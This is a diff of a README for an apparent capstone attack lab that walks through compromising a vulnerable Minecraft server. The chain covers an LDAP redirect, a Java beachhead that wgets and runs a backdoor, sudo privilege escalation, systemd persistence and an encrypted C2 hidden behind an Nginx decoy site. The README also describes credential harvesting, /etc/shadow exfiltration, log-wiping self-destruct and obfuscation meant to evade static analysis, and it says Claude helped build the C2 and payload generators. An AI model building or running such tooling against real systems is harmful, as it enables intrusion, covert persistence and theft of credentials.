@@ -18,6 +18,7 @@ sequenceDiagram
     participant Web8888 as Payload HTTP (8888)
     participant Web8000 as Payload HTTP (8000)
     participant C2 as Docker C2 (5000)
+    participant Proxy as Nginx Proxy (80)
     end
     
     box rgb(230, 240, 255) Victim Infrastructure
@@ -36,15 +37,20 @@ sequenceDiagram
     Server->>Root: 6. Trigger PrivEsc (CVE-2025-32463)
     Root-->>Server: Spawns root execution context
     Server->>Root: 7. Write & Start systemd-cache.service
-    Note over Root,C2: Persistence Established
-    Root->>C2: 8. POST /checkin (Encrypted Hostname)
+    Note over Root,Proxy: Persistence Established
+    Root->>Proxy: 8. POST /api/v1/checkin (Encrypted Hostname)
+    Proxy->>C2: Forward to /checkin
     loop Every 5-20 seconds (Jittered)
-        Root->>C2: 9. GET /command
-        C2-->>Root: Encrypted Command
+        Root->>Proxy: 9. GET /api/v1/command
+        Proxy->>C2: Forward to /command
+        C2-->>Proxy: Encrypted Command
+        Proxy-->>Root: Return Command
         Note right of Root: Executes locally
-        Root->>C2: POST /result (Encrypted Output)
+        Root->>Proxy: POST /api/v1/result (Encrypted Output)
+        Proxy->>C2: Forward to /result
         opt If Exfil Command
-            Root->>C2: POST /exfil (Encrypted Base64 File)
+            Root->>Proxy: POST /api/v1/exfil (Encrypted Base64 File)
+            Proxy->>C2: Forward to /exfil
         end
     end
 ```
@@ -122,11 +128,36 @@ Now that you have cloned the repo and built the tools, you will be primarily wor
 
 ```
 ~/564Capstone/
-├── c2-server/       # Command & Control Docker container
-├── payload/         # Beachhead.java and Persistent.cpp
-├── privesc/         # sudo exploit
-└── server/          # Minecraft server
+├── c2-server/       # Command & Control Docker container (Flask + Dashboard)
+├── nginx-proxy/     # Nginx reverse proxy (Stealth cover site + API passthrough)
+├── payload/         # Beachhead.java and Persistent.cpp (The implants)
+├── privesc/         # sudo exploit (CVE-2025-32463)
+├── server/          # Vulnerable Minecraft 1.17 server
+├── marshalsec/      # LDAP Redirect server
+└── crypto/          # Shared encryption logic (Fernet/AES)
 ```
+
+---
+
+## Step 0 — Attacker Infrastructure Setup
+
+Before launching the attack, you must have your Command & Control (C2) infrastructure and Stealth Proxy running.
+
+### 1. Build and Run the C2 Server
+The C2 server runs in a Docker container to ensure a consistent environment.
+```bash
+cd ~/564Capstone/c2-server
+docker build -t c2-server-draft .
+docker run -d -p 5000:5000 --name capstone-c2-server-draft c2-server-draft
+```
+
+### 2. Launch the Nginx Stealth Proxy
+The Nginx proxy serves a fake marketing page at `http://localhost/` to hide the C2. It transparently forwards `/api/v1/*` traffic to the C2 container.
+```bash
+cd ~/564Capstone/nginx-proxy
+docker compose up -d
+```
+*Note: The proxy and C2 containers will automatically link via a shared Docker network. If troubles occur, use the manual connection method in the original README.md file located in ~/564Capstone/nginx-proxy/README.md*
 
 ---
 
@@ -196,25 +227,6 @@ Open a new terminal:
 
 ```
 cd ~/564Capstone/payload
-nano Beachhead.java
-```
-
-Paste the following:
-
-```
-public class Beachhead { ... }
-```
-
-*(Alternatively, you can copy the contents of `BeachheadObfuscated.java` provided in this repository, which employs ProGuard-style obfuscation to evade static analysis.)*
-public class Beachhead {
-    static {
-        try {
-            // Download the Persistent.elf backdoor and execute it
-            String[] cmd = {"/bin/bash", "-c", "wget -q http://127.0.0.1:8000/Persistent.elf -O /tmp/p && chmod +x /tmp/p && /tmp/p"};
-            Runtime.getRuntime().exec(cmd);
-        } catch (Exception e) {}
-    }
-}
 ```
 
 Compile it targeting Java 17 bytecode (use the obfuscated filename if you chose that route):
@@ -223,14 +235,16 @@ Compile it targeting Java 17 bytecode (use the obfuscated filename if you chose 
 /usr/lib/jvm/java-17-openjdk-amd64/bin/javac Beachhead.java
 ```
 
-**[NEW] Compile the C++ Persistence Backdoor**
+**Compile the C++ Persistence Backdoor**
 You must compile the `Persistent.cpp` source code into an ELF binary before deploying. It is crucial to statically link it and include the OpenSSL libraries so it runs properly on the victim machine regardless of system libraries:
 
 ```
 # NOTE: Update the 127.0.0.1 IP inside Persistent.cpp and Beachhead.java 
 # to your ATTACKER machine's IP if you are testing across a network!
-g++ -std=c++17 -static Persistent.cpp -o Persistent.elf -lssl -lcrypto
+g++ -std=c++17 -s -static Persistent.cpp -o Persistent.elf -lssl -lcrypto
 ```
+
+
 *(Alternatively, you can run `python3 obfuscator.py` to generate and compile the obfuscated variant `PersistentObfuscated.cpp`, which encrypts strings via XOR, renames identifiers, and injects opaque predicates to evade static analysis).*
 
 Confirm the compiled files exist:
@@ -321,6 +335,24 @@ docker logs -f capstone-c2-server-draft
 
 You should see an incoming `[+] Check-in received` containing your victim machine's hostname, followed by a `[+] Result received` block containing full automated recon data. Your reverse shell backdoor is now permanently installed via systemd, communicating via native C++ sockets over AES-128-CBC encrypted payloads, and polling for future commands.
 
+A sample html file depicting a potential C2 dashboard after a successful exploit is located at `C2_Dashboard_Result.html`.
+
+Commands include
+```
+whoami, pwd, network_sweep, credential_harvest, full_chain, self_destruct
+```
+
+Tasks are queued and executed immediately upon receipt, and results are returned to the C2 server. 
+
+Full chain includes all commands from initial_recon to credential_harvest and exfils /etc/shadow along with any other credentials it may find.
+
+Exfil is recieved in the form of a base64 payload, which can be decoded using any base64 decoder.
+
+![Sample Exfil](./images/Sample_Exfil.png)
+
+Self destruct deletes implant and removes it from systemd, preventing further execution, as well as removing files and logs associated with the exploit.
+
+
 ---
 
 ## Quickstart
@@ -347,7 +379,7 @@ To quickly preview each pane use `ctrl+b w`. To switch windows use `ctrl+b [pane
 
 You may also clone this repository to directly download all relevant build files, but be forewarned that it may not compile or run correctly on your machine if you are using a different OS / VM or do not have the relevant Java version and all other necessary packages installed. 
 
-**AI Disclaimer:** This README.md has been formatted and outlined with the help of AI (Claude by Anthropic). Other relevant files, such as the C2 server, have also been created using the assistance of AI. 
+**AI Disclaimer:** This README.md has been formatted and outlined with the help of AI (Claude by Anthropic). Other relevant files, such as the C2 server, payload-generator scripts, and helper scripts have also been created using the assistance of AI. 
 
 ## Cryptography
 
